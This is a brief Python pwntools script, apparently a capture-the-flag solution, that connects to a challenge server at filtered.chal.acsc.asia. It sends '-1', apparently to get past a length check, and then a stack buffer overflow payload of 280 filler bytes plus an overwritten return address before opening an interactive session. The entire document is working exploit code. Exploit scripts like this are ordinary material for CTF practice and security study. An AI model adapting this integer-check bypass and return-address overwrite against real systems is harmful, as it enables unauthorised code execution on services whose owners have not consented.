from pwn import *

payload = 280*b'A'+p64(0x00000000004011d6)

io = remote('filtered.chal.acsc.asia', 9001)
io.sendline('-1')
io.sendline(payload)

io.interactive()
